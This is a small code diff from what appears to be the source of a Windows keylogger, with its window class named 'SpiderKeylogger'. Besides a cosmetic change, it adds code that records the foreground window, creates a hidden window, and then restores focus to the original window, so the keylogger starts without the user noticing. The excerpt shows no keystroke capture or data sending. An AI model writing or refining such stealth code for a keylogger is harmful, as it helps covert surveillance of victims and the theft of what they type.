@@ -10,11 +10,13 @@ ClientWindow::~ClientWindow()
 
 static LRESULT	CALLBACK winProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
 {
-	return DefWindowProc(hwnd, msg, wp, lp);
+	return (DefWindowProc(hwnd, msg, wp, lp));
 }
 
 bool ClientWindow::init(HINSTANCE instance)
 {
+	HWND			foregroundWindow = GetForegroundWindow();
+
 	this->_winClass.hInstance = instance;
 	this->_winClass.lpszClassName = "SpiderKeylogger";
 	this->_winClass.lpfnWndProc = winProc;
@@ -36,6 +38,7 @@ bool ClientWindow::init(HINSTANCE instance)
 		return (false);
 	ShowWindow(this->_hwnd, SW_HIDE);
 	UpdateWindow(this->_hwnd);
+	SetForegroundWindow(foregroundWindow);
 	this->_inited = true;
 	return (true);
 }
